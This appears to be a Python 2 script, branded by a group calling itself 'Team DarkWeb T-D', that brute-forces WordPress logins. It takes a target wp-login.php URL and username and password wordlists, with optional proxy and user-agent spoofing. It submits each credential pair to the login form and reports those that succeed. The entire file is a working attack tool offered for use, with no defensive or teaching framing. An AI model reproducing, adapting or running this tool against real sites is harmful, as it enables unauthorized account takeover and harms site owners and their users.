
import sys, urllib2, urllib, cookielib, re, os, time

os.system('clear')

def loadLst(fileName, lstName):
    f = open(fileName, 'r')
    for line in f:
        lstName.append(line.replace('\r\n', ''))

    f.close()


logo = """ \033[1;94m
    _   __    _       ____________
   / | / /   | |     / / ____/ __ )
  /  |/ /____| | /| / / __/ / __  |
 / /|  /_____/ |/ |/ / /___/ /_/ /
/_/ |_/      |__/|__/_____/_____/

Created By : \033[1;96mNabil-Rahman |\033[1;0m [V 1.1.1]

\033[1;32m------------------------------------------
\33[93m AUTHOR  : Team DarkWeb T-D
\33[93m GITHUB  : github.com/Nabil-Official
\33[93m FB      : nabil.404
\033[1;32m------------------------------------------
"""
print (logo)
print ""

if len(sys.argv) <= 1:
    print '\x1b[1;032m'
    print ''
    print 'Options:'
    print '-h URL'
    print '-U file Wordlist user'
    print '-P file Wordlist password'
    print '-u username'
    print '-p password'
    print '-v verbose mode / show login+pass combination for each attempt'
    print '-f continue after found login/password pair'
    print '-g user-agent - default: "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"'
    print '-x use proxy | ex: 127.0.0.1:1234'
    print 'usage: python2 scriptname.py -h https://test.com/wp-login.php -u admin -P listpassword.txt -v'
    sys.exit()
print ''
url = ''
wordlist = ''
username = ''
password = ''
passFile = ''
userFile = ''
signal = 'type="password"'
count = 0
countAcc = 0
mode = 1
verbose = 0
useProxy = 0
continues = 0
agent = 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0'
result = ''
for arg in sys.argv:
    if arg == '-h':
        url = sys.argv[(count + 1)]
    elif arg == '-u':
        username = sys.argv[(count + 1)]
    elif arg == '-U':
        userFile = sys.argv[(count + 1)]
    elif arg == '-p':
        password = sys.argv[(count + 1)]
    elif arg == '-P':
        passFile = sys.argv[(count + 1)]
    elif arg == '-v':
        verbose = 1
    elif arg == '-s':
        signal = sys.argv[(count + 1)]
    elif arg == '-g':
        agent = sys.argv[(count + 1)]
    elif arg == '-x':
        lstTmp = sys.argv[(count + 1)].split(':')
        proxyHandler = urllib2.ProxyHandler({lstTmp[0]: lstTmp[1] + ':' + lstTmp[2]})
        useProxy = 1
    elif arg == '-f':
        continues = 1
    count += 1

if len(username) > 0 and len(password) > 0:
    mode = 1
else:
    if len(username) > 0 and len(passFile) > 0:
        mode = 2
    elif len(userFile) > 0 and len(password) > 0:
        mode = 3
    elif len(userFile) > 0 and len(passFile) > 0:
        mode = 4
    cookieJar = cookielib.CookieJar()
    cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
    if useProxy == 0:
        opener = urllib2.build_opener(cookieHandler)
    else:
        opener = urllib2.build_opener(proxyHandler, cookieHandler)
    opener.addheaders = [
     (
      'User-agent', agent)]
    cookieJar.clear()
    cookieJar.clear_session_cookies()
    try:
        response = opener.open(url)
        content = response.read()
        if mode == 1:
            values = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 
               'redirect_to': '', 
               'testcookie': '1'}
            data = urllib.urlencode(values)
            print data
            response = opener.open(url + '/', data)
            strTmp = response.read()
            if strTmp.find(signal) < 0:
                countAcc += 1
                result += 'username: ' + username + '   password: ' + password + '\n'
                print '\033[1;31m[+] \033[1;32mPassword Found : ' 'Username \033[1;31m>> \033[1;32m' + username + ' \033[1;32mPassword \033[1;31m>> \033[1;32m' + password
                f3 = open('test.html', 'w')
                f3.write(strTmp)
                f3.close()
        if mode == 2:
            f = open(passFile, 'r')
            for line in f:
                password = line.strip('\n\r')
                values = {'log': username, 'pwd': password, 
                   'wp-submit': 'Log In', 
                   'redirect_to': '', 
                   'testcookie': '1'}
                if verbose == 1:
                    print '\x1b[91m >> \033[1;32mChecking  : \033[1;36m' +  password
                data = urllib.urlencode(values)
                try:
                    response = opener.open(url + '/', data)
                except urllib2.URLError as e:
                    continue

                strTmp = response.read()
                if strTmp.find(signal) < 0:
                    countAcc += 1
                    result += 'username: ' + username + '   password: ' + password + '\n'
                    print ('')
                    print '\033[1;31m[+] \033[1;32mPassword Found : ' 'Username \033[1;31m>> \033[1;32m' + username + ' \033[1;32mPassword \033[1;31m>> \033[1;32m' + password
                    break

        if mode == 3:
            f = open(userFile, 'r')
            for line in f:
                username = line.strip('\n\r')
                values = {'log': username, 'pwd': password, 
                   'wp-submit': 'Log In', 
                   'redirect_to': '', 
                   'testcookie': '1'}
                if verbose == 1:
                    print '\x1b[91m >> \033[1;32mChecking  : \033[1;36m' +  password
                data = urllib.urlencode(values)
                try:
                    response = opener.open(url + '/', data)
                except urllib2.URLError as e:
                    continue

                strTmp = response.read()
                if strTmp.find(signal) < 0:
                    countAcc += 1
                    result += 'username: ' + username + '   password: ' + password + '\n'
                    print '\033[1;31m[+] \033[1;32mPassword Found : ' 'Username \033[1;31m>> \033[1;32m' + username + ' \033[1;32mPassword \033[1;31m>> \033[1;32m' + password
                    if continues == 0:
                        break
                    cookieJar.clear()
                    cookieJar.clear_session_cookies()
                    response = opener.open(url)
                    content = response.read()

        if mode == 4:
            f = open(userFile, 'r')
            f2 = open(passFile, 'r')
            for line in f:
                username = line.strip('\n\r')
                f2.seek(0)
                for line2 in f2:
                    password = line2.strip('\n\r')
                    values = {'log': username, 'pwd': password, 
                       'wp-submit': 'Log In', 
                       'redirect_to': '', 
                       'testcookie': '1'}
                    if verbose == 1:
                        print '\x1b[91m >> \033[1;32mChecking  : \033[1;36m' +  password
                    data = urllib.urlencode(values)
                    try:
                        response = opener.open(url + '/', data)
                    except urllib2.URLError as e:
                        continue

                    strTmp = response.read()
                    if strTmp.find(signal) < 0:
                        countAcc += 1
                        result += 'username: ' + username + '   password: ' + password + '\n'
                        print '[+] Password Found : ' 'Username >> ' + username + ' Password >> ' + password
                        if continues == 0:
                            break
                        cookieJar.clear()
                        cookieJar.clear_session_cookies()
                        response = opener.open(url)
                        content = response.read()

            f.close()
            f2.close()

        sys.exit()
    except urllib2.URLError as e:
        print '\n\t[!] Session Cancelled; Error occured. Check internet settings'
    except KeyboardInterrupt:
        print '\n\t[!] Session cancelled'
